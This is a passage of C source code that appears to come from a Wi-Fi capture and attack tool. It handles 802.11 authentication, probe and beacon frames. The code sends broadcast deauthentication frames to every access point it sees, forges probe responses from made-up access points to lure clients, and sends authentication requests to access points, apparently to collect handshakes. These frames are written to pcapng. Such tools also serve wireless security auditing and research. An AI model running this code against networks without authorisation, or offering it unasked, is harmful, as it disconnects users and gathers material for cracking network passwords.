		if(payload_len > 6)
			{
			if(memcmp(macfrx->addr2, &mac_mysta, 6) != 0)
				{
				writeepb(fd_pcapng);
				}
			}
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, OPEN SYSTEM, STATUS %d, SEQUENCE %d]\n", auth->statuscode, macfrx->sequence >> 4);
		}
	}
else if(auth->authentication_algho == SAE)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		if(auth->authentication_seq == 1)
			{
			printtimenet(macfrx->addr1, macfrx->addr2);
			fprintf(stdout, " [AUTHENTICATION, SAE COMMIT, STATUS %d, SEQUENCE %d]\n", auth->statuscode, macfrx->sequence >> 4);
			}
		else if(auth->authentication_seq == 2)
			{
			printtimenet(macfrx->addr1, macfrx->addr2);
			fprintf(stdout, " [AUTHENTICATION, SAE CONFIRM, STATUS %d, SEQUENCE %d]\n", auth->statuscode, macfrx->sequence >> 4);
			}
		}
	}
else if(auth->authentication_algho == SHARED_KEY)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, SHARED KEY, STATUS %d, SEQUENCE %d]\n", auth->statuscode, macfrx->sequence >> 4);
		}
	}
else if(auth->authentication_algho == FBT)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, FAST TRANSITION, STATUS %d, SEQUENCE %d]\n", auth->statuscode, macfrx->sequence >> 4);
		}
	}
else if(auth->authentication_algho == FILS)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, FILS, STATUS %d, SEQUENCE %d]\n", auth->statuscode, macfrx->sequence >> 4);
		}
	}
else if(auth->authentication_algho == FILSPFS)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, FILS PFS, STATUS %d, SEQUENCE %d]\n", auth->statuscode, macfrx->sequence >> 4);
		}
	}
else if(auth->authentication_algho == FILSPK)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, FILS PK, STATUS %d, SEQUENCE %d]\n", auth->statuscode, macfrx->sequence >> 4);
		}
	}
else if(auth->authentication_algho == NETWORKEAP)
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	if((statusout & STATUS_AUTH) == STATUS_AUTH)
		{
		printtimenet(macfrx->addr1, macfrx->addr2);
		fprintf(stdout, " [AUTHENTICATION, NETWORK EAP, STATUS %d, SEQUENCE %d]\n", auth->statuscode, macfrx->sequence >> 4);
		}
	}
else
	{
	if(fd_pcapng != 0)
		{
		writeepb(fd_pcapng);
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211probe_resp()
{
aplist_t *zeiger;
static uint8_t *apinfoptr;
static int apinfolen;
static uint8_t *essidtagptr;
static ietag_t *essidtag = NULL;
static uint8_t *channeltagptr;
static ietag_t *channeltag = NULL;
static uint8_t *rsntagptr;
static ietag_t *rsntag = NULL;

if(memcmp(&mac_myap, macfrx->addr2, 6) == 0)
	{
	return;
	}
if(payload_len < (int)CAPABILITIESAP_SIZE)
	{
	return;
	}
apinfoptr = payload_ptr +CAPABILITIESAP_SIZE;
apinfolen = payload_len -CAPABILITIESAP_SIZE;
if(apinfolen < (int)IETAG_SIZE)
	{
	return;
	}

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0)
		{
		aplist_ptr = zeiger;
		break;
		}
	if(memcmp(zeiger->addr, macfrx->addr2, 6) == 0)
		{
		zeiger->timestamp = timestamp;
		if((zeiger->essid_len == 0) || (zeiger->essid[0] == 0))
			{
			essidtagptr = gettag(TAG_SSID, apinfoptr, apinfolen);
			if(essidtagptr != NULL)
				{
				essidtag = (ietag_t*)essidtagptr;
				if(essidtag->len <= ESSID_LEN_MAX)
					{
					zeiger->essid_len = essidtag->len;
					memcpy(zeiger->essid, essidtag->data, essidtag->len);
					}
				}
			}
		if(memcmp(&mac_mysta, macfrx->addr1, 6) == 0)
			{
			zeiger->status = 1;
			return;
			}
		if(((zeiger->count %apattacksintervall) == 0) && (zeiger->count < (apattacksmax *apattacksintervall)))
			{
			if(attackapflag == false)
				{
				send_directed_proberequest(macfrx->addr2, zeiger->essid_len, zeiger->essid);
				zeiger->status = 0;
				}
			}
		zeiger->count++;
		return;
		}
	}

if((aplist_ptr -aplist) >= APLIST_MAX)
	{
	qsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_time);
	aplist_ptr = aplist;
	}

memset(aplist_ptr, 0, APLIST_SIZE);

aplist_ptr->timestamp = timestamp;
if(memcmp(&mac_mysta, macfrx->addr1, 6) == 0)
	{
	aplist_ptr->status = 1;
	}
memcpy(aplist_ptr->addr, macfrx->addr2, 6);

aplist_ptr->channel = channelscanlist[cpa];
channeltagptr = gettag(TAG_CHAN, apinfoptr, apinfolen);
if(channeltagptr != NULL)
	{
	channeltag = (ietag_t*)channeltagptr;
	aplist_ptr->channel = channeltag->data[0];
	}

essidtagptr = gettag(TAG_SSID, apinfoptr, apinfolen);
if(essidtagptr != NULL)
	{
	essidtag = (ietag_t*)essidtagptr;
	if(essidtag->len <= ESSID_LEN_MAX)
		{
		aplist_ptr->essid_len = essidtag->len;
		memcpy(aplist_ptr->essid, essidtag->data, essidtag->len);
		}
	}

rsntagptr = gettag(TAG_RSN, apinfoptr, apinfolen);
if(rsntagptr != NULL)
	{
	rsntag = (ietag_t*)rsntagptr;
	if((rsntag->len >= 20) && (rsntag->len <= RSN_LEN_MAX))
		{
		aplist_ptr->rsn_len = rsntag->len;
		memcpy(aplist_ptr->rsn, rsntag->data, rsntag->len);
		}
	}

if(attackapflag == false)
	{
	if(memcmp(&mac_mysta, macfrx->addr1, 6) != 0)
		{
		send_directed_proberequest(macfrx->addr2, essidtag->len, essidtag->data);
		}
	aplist_ptr->count = 1;
	}
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
if((statusout & STATUS_PROBES) == STATUS_PROBES)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	printessid(aplist_ptr->essid_len, aplist_ptr->essid);
	fprintf(stdout, " [PROBERESPONSE, SEQUENCE %d, AP CHANNEL %d]\n", macfrx->sequence >> 4, aplist_ptr->channel);
	}
aplist_ptr++;
return;
}
/*===========================================================================*/
static inline void send_proberesponse(uint8_t *macsta, uint8_t *macap, uint8_t essid_len, uint8_t *essid)
{
static mac_t *macftx;
static capap_t *capap;

const uint8_t proberesponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
0x03, 0x01, 0x05,
0x2a, 0x01, 0x00,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x05, 0x0d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x6f, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
0x10, 0x3b, 0x00, 0x01, 0x03, 0x10, 0x47, 0x00, 0x10, 0xd5, 0x6c, 0x63, 0x68, 0xb0, 0x16, 0xf7,
0xc3, 0x09, 0x22, 0x34, 0x81, 0xc4, 0xe7, 0x99, 0x1b, 0x10, 0x21, 0x00, 0x03, 0x41, 0x56, 0x4d,
0x10, 0x23, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x24, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30,
0x10, 0x42, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30, 0x10, 0x54, 0x00, 0x08, 0x00, 0x06, 0x00, 0x50,
0xf2, 0x04, 0x00, 0x01, 0x10, 0x11, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x08, 0x00, 0x02,
0x23, 0x88, 0x10, 0x3c, 0x00, 0x01, 0x01, 0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01,
0x20
};
#define PROBERESPONSE_SIZE sizeof(proberesponsedata)

static uint8_t packetout[1024];

if((filtermode == 1) && (checkfilterlistentry(macsta) == true))
	{
	return;
	}
if((filtermode == 2) && (checkfilterlistentry(macsta) == false))
	{
	return;
	}
if(checkpownedstaap(macsta, macap) >= 3)
	{
	return;
	}

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +ESSID_LEN_MAX +IETAG_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macftx->addr1, macsta, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->sequence = myproberesponsesequence++ << 4;
if(myproberesponsesequence >= 4096)
	{
	myproberesponsesequence = 0;
	}
capap = (capap_t*)(packetout +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime;
capap->beaconintervall = 0x640;
capap->capabilities = 0x431;

packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = essid_len;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], essid, essid_len);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essid_len], &proberesponsedata, PROBERESPONSE_SIZE);
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essid_len +0x0c] = channelscanlist[cpa];
if(send(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +essid_len +PROBERESPONSE_SIZE, 0) < 0)
	{
	errorcount++;
	outgoingcount--;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void process80211probe_req()
{
static uint8_t *essidtagptr;
static ietag_t *essidtag;
static myaplist_t *zeiger;

if(memcmp(&mac_mysta, macfrx->addr2, 6) == 0)
	{
	return;
	}

if(payload_len < (int)IETAG_SIZE)
	{
	return;
	}
essidtagptr = gettag(TAG_SSID, payload_ptr, payload_len);
if(essidtagptr == NULL)
	{
	return;
	}

essidtag = (ietag_t*)essidtagptr;
if((essidtag->len == 0) || (essidtag->len > ESSID_LEN_MAX) || (essidtag->data[0] == 0))
	{
	return;
	}

for(zeiger = myaplist; zeiger < myaplist +MYAPLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0)
		{
		myaplist_ptr = zeiger;
		break;
		}
	if((zeiger->essid_len == essidtag->len) && (memcmp(zeiger->essid, essidtag->data, essidtag->len) == 0))
		{
		zeiger->timestamp = timestamp;
		send_proberesponse(macfrx->addr2, zeiger->addr, zeiger->essid_len, zeiger->essid);
		return;
		}
	}

if((myaplist_ptr -myaplist) >= MYAPLIST_MAX)
	{
	qsort(myaplist, MYAPLIST_MAX, MYAPLIST_SIZE, sort_myaplist_by_time);
	myaplist_ptr = myaplist;
	}

memset(myaplist_ptr, 0, MYAPLIST_SIZE);
myaplist_ptr->timestamp = timestamp;
mynicap++;
myaplist_ptr->addr[5] = mynicap & 0xff;
myaplist_ptr->addr[4] = (mynicap >> 8) & 0xff;
myaplist_ptr->addr[3] = (mynicap >> 16) & 0xff;
myaplist_ptr->addr[2] = myouiap & 0xff;
myaplist_ptr->addr[1] = (myouiap >> 8) & 0xff;
myaplist_ptr->addr[0] = (myouiap >> 16) & 0xff;
myaplist_ptr->essid_len = essidtag->len;
memcpy(myaplist_ptr->essid, essidtag->data, essidtag->len);
send_proberesponse(macfrx->addr2, myaplist_ptr->addr, myaplist_ptr->essid_len, myaplist_ptr->essid);

if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
if((statusout & STATUS_PROBES) == STATUS_PROBES)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	printessid(myaplist_ptr->essid_len, myaplist_ptr->essid);
	fprintf(stdout, " [PROBEREQUEST, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
aplist_ptr++;
return;
}
/*===========================================================================*/
static inline void process80211directed_probe_req()
{
static uint8_t *essidtagptr;
static ietag_t *essidtag;
static myaplist_t *zeiger;

if(memcmp(&mac_mysta, macfrx->addr2, 6) == 0)
	{
	return;
	}
if(payload_len < (int)IETAG_SIZE)
	{
	return;
	}
essidtagptr = gettag(TAG_SSID, payload_ptr, payload_len);
if(essidtagptr == NULL)
	{
	return;
	}
essidtag = (ietag_t*)essidtagptr;
if((essidtag->len == 0) || (essidtag->len > ESSID_LEN_MAX) || (essidtag->data[0] == 0))
	{
	return;
	}

for(zeiger = myaplist; zeiger < myaplist +MYAPLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0)
		{
		myaplist_ptr = zeiger;
		break;
		}
	if((memcmp(zeiger->addr, macfrx->addr1, 6) == 0) && (zeiger->essid_len == essidtag->len) && (memcmp(zeiger->essid, essidtag->data, essidtag->len) == 0))
		{
		zeiger->timestamp = timestamp;
		send_proberesponse(macfrx->addr2, zeiger->addr, zeiger->essid_len, zeiger->essid);
		return;
		}
	}

if((myaplist_ptr -myaplist) >= MYAPLIST_MAX)
	{
	qsort(myaplist, MYAPLIST_MAX, MYAPLIST_SIZE, sort_myaplist_by_time);
	myaplist_ptr = myaplist;
	}

memset(myaplist_ptr, 0, MYAPLIST_SIZE);
myaplist_ptr->timestamp = timestamp;
memcpy(myaplist_ptr->addr, macfrx->addr1, 6);
myaplist_ptr->essid_len = essidtag->len;
memcpy(myaplist_ptr->essid, essidtag->data, essidtag->len);
send_proberesponse(macfrx->addr2, myaplist_ptr->addr, myaplist_ptr->essid_len, myaplist_ptr->essid);
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
if((statusout & STATUS_PROBES) == STATUS_PROBES)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	printessid(aplist_ptr->essid_len, aplist_ptr->essid);
	fprintf(stdout, " [PROBEREQUEST, SEQUENCE %d]\n", macfrx->sequence >> 4);
	}
aplist_ptr++;
return;
}
/*===========================================================================*/
static inline void process80211rcascanproberesponse()
{
aplist_t *zeiger;
static uint8_t *apinfoptr;
static int apinfolen;
static uint8_t *essidtagptr;
static ietag_t *essidtag = NULL;
static uint8_t *channeltagptr;
static ietag_t *channeltag = NULL;
static uint8_t *rsntagptr;
static ietag_t *rsntag = NULL;

if(memcmp(&mac_myap, macfrx->addr2, 6) == 0)
	{
	return;
	}
if(payload_len < (int)CAPABILITIESAP_SIZE)
	{
	return;
	}
apinfoptr = payload_ptr +CAPABILITIESAP_SIZE;
apinfolen = payload_len -CAPABILITIESAP_SIZE;
if(apinfolen < (int)IETAG_SIZE)
	{
	return;
	}

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0)
		{
		aplist_ptr = zeiger;
		break;
		}
	if(memcmp(zeiger->addr, macfrx->addr2, 6) == 0)
		{
		zeiger->timestamp = timestamp;
		if((zeiger->essid_len == 0) || (zeiger->essid[0] == 0))
			{
			essidtagptr = gettag(TAG_SSID, apinfoptr, apinfolen);
			if(essidtagptr != NULL)
				{
				essidtag = (ietag_t*)essidtagptr;
				if(essidtag->len <= ESSID_LEN_MAX)
					{
					zeiger->essid_len = essidtag->len;
					memcpy(zeiger->essid, essidtag->data, essidtag->len);
					}
				}
			}
		if(memcmp(&mac_mysta, macfrx->addr1, 6) == 0)
			{
			zeiger->status = 1;
			return;
			}
		if(((zeiger->count %apattacksintervall) == 0) && (zeiger->count < (apattacksmax *apattacksintervall)))
			{
			if(attackapflag == false)
				{
				send_directed_proberequest(macfrx->addr2, zeiger->essid_len, zeiger->essid);
				zeiger->status = 0;
				}
			}
		zeiger->count++;
		return;
		}
	}

if((aplist_ptr -aplist) >= APLIST_MAX)
	{
	qsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_time);
	aplist_ptr = aplist;
	}

memset(aplist_ptr, 0, APLIST_SIZE);

aplist_ptr->timestamp = timestamp;
if(memcmp(&mac_mysta, macfrx->addr1, 6) == 0)
	{
	aplist_ptr->status = 1;
	}
memcpy(aplist_ptr->addr, macfrx->addr2, 6);

aplist_ptr->channel = channelscanlist[cpa];
channeltagptr = gettag(TAG_CHAN, apinfoptr, apinfolen);
if(channeltagptr != NULL)
	{
	channeltag = (ietag_t*)channeltagptr;
	aplist_ptr->channel = channeltag->data[0];
	}

essidtagptr = gettag(TAG_SSID, apinfoptr, apinfolen);
if(essidtagptr != NULL)
	{
	essidtag = (ietag_t*)essidtagptr;
	if(essidtag->len <= ESSID_LEN_MAX)
		{
		aplist_ptr->essid_len = essidtag->len;
		memcpy(aplist_ptr->essid, essidtag->data, essidtag->len);
		}
	}

rsntagptr = gettag(TAG_RSN, apinfoptr, apinfolen);
if(rsntagptr != NULL)
	{
	rsntag = (ietag_t*)rsntagptr;
	if((rsntag->len >= 20) && (rsntag->len <= RSN_LEN_MAX))
		{
		aplist_ptr->rsn_len = rsntag->len;
		memcpy(aplist_ptr->rsn, rsntag->data, rsntag->len);
		}
	}

if(attackapflag == false)
	{
	if(memcmp(&mac_mysta, macfrx->addr1, 6) != 0)
		{
		send_directed_proberequest(macfrx->addr2, essidtag->len, essidtag->data);
		}
	aplist_ptr->count++;
	}
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
aplist_ptr++;
aplistcount++;
if(aplistcount > APLIST_MAX)
	{
	aplistcount = APLIST_MAX;
	}
return;
}
/*===========================================================================*/
static inline void process80211rcascanbeacon()
{
aplist_t *zeiger;
static uint8_t *apinfoptr;
static int apinfolen;
static uint8_t *essidtagptr;
static ietag_t *essidtag = NULL;
static uint8_t *channeltagptr;
static ietag_t *channeltag = NULL;
static uint8_t *rsntagptr;
static ietag_t *rsntag = NULL;

if(payload_len < (int)CAPABILITIESAP_SIZE)
	{
	return;
	}
apinfoptr = payload_ptr +CAPABILITIESAP_SIZE;
apinfolen = payload_len -CAPABILITIESAP_SIZE;
if(apinfolen < (int)IETAG_SIZE)
	{
	return;
	}

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0)
		{
		aplist_ptr = zeiger;
		break;
		}
	if(memcmp(zeiger->addr, macfrx->addr2, 6) == 0)
		{
		if(memcmp(&mac_mysta, macfrx->addr1, 6) == 0)
			{
			zeiger->status = 1;
			}
		if(((zeiger->count %apattacksintervall) == 0) && (zeiger->count < (apattacksmax *apattacksintervall)))
			{
			if(attackapflag == false)
				{
				zeiger->status = 0;
				send_directed_proberequest(macfrx->addr2, zeiger->essid_len, zeiger->essid);
				}
			}
		zeiger->count++;
		return;
		}
	}

if((aplist_ptr -aplist) >= APLIST_MAX)
	{
	qsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_time);
	aplist_ptr = aplist;
	}

memset(aplist_ptr, 0, APLIST_SIZE);
aplist_ptr->timestamp = timestamp;
if(memcmp(&mac_mysta, macfrx->addr1, 6) == 0)
	{
	aplist_ptr->status = 1;
	}
memcpy(aplist_ptr->addr, macfrx->addr2, 6);

aplist_ptr->channel = channelscanlist[cpa];
channeltagptr = gettag(TAG_CHAN, apinfoptr, apinfolen);
if(channeltagptr != NULL)
	{
	channeltag = (ietag_t*)channeltagptr;
	aplist_ptr->channel = channeltag->data[0];
	}

essidtagptr = gettag(TAG_SSID, apinfoptr, apinfolen);
if(essidtagptr != NULL)
	{
	essidtag = (ietag_t*)essidtagptr;
	if(essidtag->len <= ESSID_LEN_MAX)
		{
		aplist_ptr->essid_len = essidtag->len;
		memcpy(aplist_ptr->essid, essidtag->data, essidtag->len);
		}
	}

rsntagptr = gettag(TAG_RSN, apinfoptr, apinfolen);
if(rsntagptr != NULL)
	{
	rsntag = (ietag_t*)rsntagptr;
	if((rsntag->len >= 20) && (rsntag->len <= RSN_LEN_MAX))
		{
		aplist_ptr->rsn_len = rsntag->len;
		memcpy(aplist_ptr->rsn, rsntag->data, rsntag->len);
		}
	}

if(attackapflag == false)
	{
	send_directed_proberequest(macfrx->addr2, essidtag->len, essidtag->data);
	}
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
aplist_ptr++;
aplistcount++;
if(aplistcount > APLIST_MAX)
	{
	aplistcount = APLIST_MAX;
	}
return;
}
/*===========================================================================*/
static inline void process80211beacon()
{
aplist_t *zeiger;
static uint8_t *apinfoptr;
static int apinfolen;
static uint8_t *essidtagptr;
static ietag_t *essidtag = NULL;
static uint8_t *channeltagptr;
static ietag_t *channeltag = NULL;
static uint8_t *rsntagptr;
static ietag_t *rsntag = NULL;

if(memcmp(&mac_mybcap, macfrx->addr2, 6) == 0)
	{
	return;
	}
if(payload_len < (int)CAPABILITIESAP_SIZE)
	{
	return;
	}
apinfoptr = payload_ptr +CAPABILITIESAP_SIZE;
apinfolen = payload_len -CAPABILITIESAP_SIZE;
if(apinfolen < (int)IETAG_SIZE)
	{
	return;
	}

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0)
		{
		aplist_ptr = zeiger;
		break;
		}
	if(memcmp(zeiger->addr, macfrx->addr2, 6) == 0)
		{
		zeiger->timestamp = timestamp;
		if(((zeiger->count %deauthenticationintervall) == 0) && (zeiger->count < (deauthenticationsmax *deauthenticationintervall)))
			{
			if(deauthenticationflag == false)
				{
				send_broadcast_deauthentication(macfrx->addr2, WLAN_REASON_UNSPECIFIED);
				}
			}
		if(((zeiger->count %apattacksintervall) == 0) && (zeiger->count < (apattacksmax *apattacksintervall)))
			{
			if(attackapflag == false)
				{
				if((zeiger->rsn_len != 0) && (zeiger->essid_len != 0) && (zeiger->essid[0] != 0)) 
					{
					send_authenticationrequestopensystem(macfrx->addr2);
					}
				else
					{
					send_directed_proberequest(macfrx->addr2, essidtag->len, essidtag->data);
					}
				}
			}
		zeiger->count++;
		return;
		}
	}

if((aplist_ptr -aplist) >= APLIST_MAX)
	{
	qsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_time);
	aplist_ptr = aplist;
	}

if(deauthenticationflag == false)
	{
	send_broadcast_deauthentication(macfrx->addr2, WLAN_REASON_UNSPECIFIED);
	send_broadcast_deauthentication(macfrx->addr2 ,WLAN_REASON_UNSPECIFIED);
	aplist_ptr->count = 2;
	}

memset(aplist_ptr, 0, APLIST_SIZE);
aplist_ptr->timestamp = timestamp;
if(memcmp(&mac_mysta, macfrx->addr1, 6) == 0)
	{
	aplist_ptr->status = 1;
	}

memcpy(aplist_ptr->addr, macfrx->addr2, 6);

aplist_ptr->channel = channelscanlist[cpa];
channeltagptr = gettag(TAG_CHAN, apinfoptr, apinfolen);
if(channeltagptr != NULL)
	{
	channeltag = (ietag_t*)channeltagptr;
	aplist_ptr->channel = channeltag->data[0];
	}

essidtagptr = gettag(TAG_SSID, apinfoptr, apinfolen);
if(essidtagptr != NULL)
	{
	essidtag = (ietag_t*)essidtagptr;
	if(essidtag->len <= ESSID_LEN_MAX)
		{
		aplist_ptr->essid_len = essidtag->len;
		memcpy(aplist_ptr->essid, essidtag->data, essidtag->len);
		}
	}

rsntagptr = gettag(TAG_RSN, apinfoptr, apinfolen);
if(rsntagptr != NULL)
	{
	rsntag = (ietag_t*)rsntagptr;
	if((rsntag->len >= 20) && (rsntag->len <= RSN_LEN_MAX))
		{
		aplist_ptr->rsn_len = rsntag->len;
		memcpy(aplist_ptr->rsn, rsntag->data, rsntag->len);
		}
	}

else
	{
	aplist_ptr->status = 0;
	}

aplist_ptr->essid_len = essidtag->len;
memset(aplist_ptr->essid, 0, ESSID_LEN_MAX);
memcpy(aplist_ptr->essid, essidtag->data, essidtag->len);
if(attackapflag == false)
	{
	if((aplist_ptr->rsn_len != 0) && (aplist_ptr->essid_len != 0) && (aplist_ptr->essid[0] != 0)) 
		{
		send_authenticationrequestopensystem(macfrx->addr2);
		}
	else
		{
		send_directed_proberequest(macfrx->addr2, essidtag->len, essidtag->data);
		}
	}
if(fd_pcapng != 0)
	{
	writeepb(fd_pcapng);
	}
if((statusout & STATUS_BEACON) == STATUS_BEACON)
	{
	printtimenet(macfrx->addr1, macfrx->addr2);
	printessid(aplist_ptr->essid_len, aplist_ptr->essid);
	fprintf(stdout, " [BEACON, SEQUENCE %d, AP CHANNEL %d]\n", macfrx->sequence >> 4,aplist_ptr->channel);
	}
aplist_ptr++;
return;
}
/*===========================================================================*/
static inline void programmende(int signum)
{
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL))
	{
	wantstopflag = true;
	}
return;
}
/*===========================================================================*/
#ifdef DOGPIOSUPPORT
static inline void *rpiflashthread()
{
while(1)
	{
	sleep(5);
	if(digitalRead(7) == 1)
		{
		digitalWrite(0, HIGH);
		wantstopflag = true;
		}
	if(wantstopflag == false)
		{
		digitalWrite(0, HIGH);
		delay (25);
		digitalWrite(0, LOW);
		delay (25);
		}
	}
return NULL;
}
#endif
/*===========================================================================*/
static bool set_channel()
{
static struct iwreq pwrq;

memset(&pwrq, 0, sizeof(pwrq));
strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ -1);
pwrq.u.freq.e = 0;
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.m = channelscanlist[cpa];
if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) == -1)
	{
	return false;
	}
return true;
}
/*===========================================================================*/
static void *channelswitchthread()
{
while(1)
	{
	sleep(staytime);
	channelchangedflag = true;
	}
return NULL;
}
/*===========================================================================*/
static inline void processpackets()
{
int c;
struct sockaddr_ll ll;
socklen_t fromlen;
static rth_t *rth;
int fdnum;
fd_set readfds;
struct timeval tvfd;

uint8_t lastaddr1proberequest[6];
uint8_t lastaddr2proberequest[6];
uint16_t lastsequenceproberequest;

uint8_t lastaddr1proberesponse[6];
uint8_t lastaddr2proberesponse[6];
uint16_t lastsequenceproberesponse;

uint8_t lastaddr1authentication[6];
uint8_t lastaddr2authentication[6];
uint16_t lastsequenceauthentication;

uint8_t lastaddr1associationrequest[6];
uint8_t lastaddr2associationrequest[6];
uint16_t lastsequenceassociationrequest;

uint8_t lastaddr1associationresponse[6];
uint8_t lastaddr2associationresponse[6];
uint16_t lastsequenceassociationresponse;

uint8_t lastaddr1reassociationrequest[6];
uint8_t lastaddr2reassociationrequest[6];
uint16_t lastsequencereassociationrequest;

uint8_t lastaddr1reassociationresponse[6];
uint8_t lastaddr2reassociationresponse[6];
uint16_t lastsequencereassociationresponse;

uint8_t lastaddr1data[6];
uint8_t lastaddr2data[6];
uint16_t lastsequencedata;

memset(&lastaddr1proberequest, 0, 6);
memset(&lastaddr2proberequest, 0, 6);
lastsequenceproberequest = 0;

memset(&lastaddr1proberesponse, 0, 6);
memset(&lastaddr2proberesponse, 0, 6);
lastsequenceproberesponse = 0;

memset(&lastaddr1authentication, 0, 6);
memset(&lastaddr2authentication, 0, 6);
lastsequenceauthentication = 0;

memset(&lastaddr1associationrequest, 0, 6);
memset(&lastaddr2associationrequest, 0, 6);
lastsequenceassociationrequest = 0;

memset(&lastaddr1associationresponse, 0, 6);
memset(&lastaddr2associationresponse, 0, 6);
lastsequenceassociationresponse = 0;

memset(&lastaddr1reassociationrequest, 0, 6);
memset(&lastaddr2reassociationrequest, 0, 6);
lastsequencereassociationrequest = 0;

memset(&lastaddr1reassociationresponse, 0, 6);
